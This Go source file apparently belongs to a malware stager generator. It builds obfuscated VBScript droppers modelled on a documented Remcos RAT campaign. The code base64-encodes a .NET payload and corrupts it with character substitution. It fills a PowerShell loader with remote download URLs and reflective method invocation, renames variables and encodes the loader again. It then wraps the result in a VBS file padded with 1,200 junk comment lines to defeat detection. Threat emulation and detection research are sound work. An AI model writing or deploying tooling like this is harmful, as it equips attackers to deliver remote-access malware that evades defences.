package vbsobfuscation2

import (
    "os"
    "log"
    "strings"
    "path/filepath"
    _ "math/rand"
    _ "time"
    _ "strconv"
    "fmt"
    
    "stager_generator/utils"
)

const (
    WORDLIST_DIRECTORY = "./wordlist"
    TEMPLATE_PATH = "./obfuscation/vbsobfuscation2"
    TEMP_OUTPUT_DIRECTORY = "./temp_outfile"
)
/*
Sample Reference:
https://www.securonix.com/blog/shadowreactor-text-only-staging-net-reactor-and-in-memory-remcos-rat-deployment/
https://bazaar.abuse.ch/sample/90d552da574192494b4280a1ee733f0c8238f5e07e80b31f4b8e028ba88ee7ea/

Description:
- vbs loader deobfuscates powershell script
- 
*/

func VbsObfuscation2(dotnetFilepath string, url64 string, url32 string, getType string, getMethod string, args string) (string, string){

    fmt.Println("[*] Starting Powershell Obfuscation 1.")

    // Base64 encode original .NET file
    tempB64Dotnet := utils.Base64EncodeFile(dotnetFilepath)

    // Replace a b64 character with invalid characters
    originalChar := "A"
    newChar := "$$"
    
    tempB64Dotnet = strings.ReplaceAll(tempB64Dotnet, originalChar, newChar)

    // Writing encode file
    sl := strings.Split(url64, "/")
    encodedFilename := sl[len(sl)-1]
    if (encodedFilename == ""){
        encodedFilename = "Encoded_dotnet_file.txt"
    }
    tempDst := filepath.Join(TEMP_OUTPUT_DIRECTORY, encodedFilename)
    err := os.WriteFile(tempDst, []byte(tempB64Dotnet), 0644)
    if err != nil{
        log.Fatal(err)
    }

    // Replacing placeholders in loader.ps1
    templatePsFilePath := filepath.Join(TEMPLATE_PATH, "/loader.ps1")
    content, err := os.ReadFile(templatePsFilePath)
    if err != nil {
        log.Fatal(err)
    }

    originalTemplateScript := string(content)

    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "NEW_CHAR", newChar)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "ORIGINAL_CHAR", originalChar)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "64BIT_URL", url64)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "32BIT_URL", url32)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "GET_TYPE", getType)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "GET_METHOD", getMethod)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "RANDOM_FILENAME", utils.RandomString(5))
    // Generate random file names
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "RANDOM_TXT_FILENAME_1", utils.RandomString(5) + ".txt")
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "RANDOM_TXT_FILENAME_2", utils.RandomString(5) + ".txt")
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "RANDOM_PS1_FILENAME_1", utils.RandomString(5) + ".ps1")

    // Add arguments if there is any
    var custom_arguments string;
    if len(args) > 0 {
        custom_arguments = "[object[]] (ARGUMENTS)"
        custom_arguments = strings.ReplaceAll(custom_arguments, "ARGUMENTS", args)
    }else{
        custom_arguments = "$null"
    }

    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "ARGUMENT_LIST", custom_arguments)

    // Removing powershell comments and renaming variables
    psLoaderScript := utils.RemovePowershellComments(utils.StringToSlice(originalTemplateScript))
    psLoaderScript = utils.ReplacePowershellVariables(psLoaderScript)
    originalTemplateScript = utils.SliceToStringOneLine(psLoaderScript)

    // Base64 encoding and obfuscate ps loader
    b64PsLoader := utils.Base64EncodeString(originalTemplateScript)

    originalChar2 := "C"
    newChar2 := "%"

    b64PsLoader = strings.ReplaceAll(b64PsLoader, originalChar2, newChar2)

    // Replacing placeholders in loader.vbs
    templateVbsFilePath := filepath.Join(TEMPLATE_PATH, "/loader.vbs")
    content, err = os.ReadFile(templateVbsFilePath)
    if err != nil {
        log.Fatal(err)
    }

    originalVbsTemplate := string(content)

    originalVbsTemplate = strings.ReplaceAll(originalVbsTemplate, "OBFUSCATED_PS_LOADER", b64PsLoader)
    originalVbsTemplate = strings.ReplaceAll(originalVbsTemplate, "ORIGINAL_CHAR", originalChar2)
    originalVbsTemplate = strings.ReplaceAll(originalVbsTemplate, "NEW_CHAR", newChar2)

    // Renaming variables
    vbsLoaderScript := utils.ReplaceVBScriptVariables(utils.StringToSlice(originalVbsTemplate))
    vbsLoaderScript = utils.ReplacePowershellVariables(vbsLoaderScript)

    // Inserting random comments
    vbsLoaderScript = insertRandomComments(vbsLoaderScript)

    // Ensure
    vbsLoaderScript[0] = "On Error Resume Next"

    originalVbsTemplate = utils.SliceToString(vbsLoaderScript)

    // Result
    var obfuscatedScript string
    obfuscatedScript = originalVbsTemplate

    return obfuscatedScript, tempDst
}

func insertRandomComments(script []string) []string {

    const STRING_SIZE = 20
    const STRING_PER_LINE = 9
    const NUM_COMMENT_LINE = 1200

    // Generate random comments
    var randomStringSlice string
    for _ = range STRING_PER_LINE {
        randomStringSlice += utils.RandomString(STRING_SIZE) + ":"
    }


    var randomCommentSlice []string
    for _ = range NUM_COMMENT_LINE {
        randomCommentSlice = append(randomCommentSlice, randomStringSlice)
    }

    return utils.InsertRandomly(script, randomCommentSlice)
}